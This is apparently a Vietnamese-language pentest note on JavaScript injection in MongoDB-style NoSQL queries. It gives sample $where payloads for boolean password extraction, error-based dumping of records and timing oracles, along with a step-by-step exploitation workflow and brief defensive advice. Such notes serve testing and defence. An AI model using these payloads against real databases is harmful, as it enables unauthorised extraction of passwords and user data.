# JavaScript Injection Trong NoSQL Context

## Tong quan

Mot so query feature trong NoSQL co the evaluate JavaScript expression. Neu input vao duoc cac feature nay, tac dong co the vuot qua muc "doi selector logic".

Context thuong gap:

- `$where`
- `mapReduce()`
- framework/library path forward object nguy hiem

## Vi sao nguy hiem hon operator injection

`Operator injection` chu yeu doi dieu kien loc.

`JavaScript injection` co the doi luong thuc thi expression, tao:

- boolean oracle manh
- timing oracle
- error-based exfiltration
- field introspection
- trong mot so bug framework: execution path nguy hiem hon mong doi

## `$where` la diem no manh

Vi du:

```js
db.users.find({ "$where": "this.username == 'admin'" })
```

Neu input duoc noi chuoi vao day, attacker co the chen expression tuy y.

## Payload mau

### Boolean extraction

```text
admin' && this.password[0] == 'a' || 'a'=='b
```

### Field probe

```text
admin' && this.password!='
admin' && this.password.match(/^\w+/) || 'a'=='b
```

### Error-based

```json
{"$where":"this.username=='bob'; throw new Error(JSON.stringify(this));"}
```

### Timing-based

```json
{"$where":"sleep(5000)"}
```

Hoac loop style payload:

```text
0;var d=new Date();do{c=new Date();}while(c-d<5000)
```

## Kich ban framework/library de bi

### Forward object truc tiep

```js
Post.find().populate({ path: "author", match: req.query.author });
```

Neu `req.query.author` khong duoc sanitize schema-based, co the mo duong cho operator/JS path.

### Library-specific hook

Mot so library co "helper operator" khong an toan neu client control duoc.

Vi du kieu:

```json
{"user":{"$func":"var_dump"}}
```

Tac dong cu the phu thuoc tung library.

### GraphQL filter confusion

Resolver forward `args.filter` truc tiep co the lo ra operator/JS context tuy schema va layer sanitize.

## Gioi han

JS injection khong phai luc nao cung kha dung.

Co the bi chan khi:

- server-side JS da disable
- `$where` khong duoc su dung
- query builder han che operator nghiem
- sanitize/allow-list de quy duoc lam dung

## Workflow de khai thac

1. Confirm operator injection truoc.
2. Test `$where` hoac expression path.
3. Tao oracle true/false.
4. Neu content diff yeu, chuyen timing.
5. Neu error leak, test error-based exfiltration.

## Luu y phong thu

Chan top-level `$where` la chua du.

Can:

- kiem soat query shape o moi layer
- sanitize de quy
- khong merge object untrusted vao nested condition
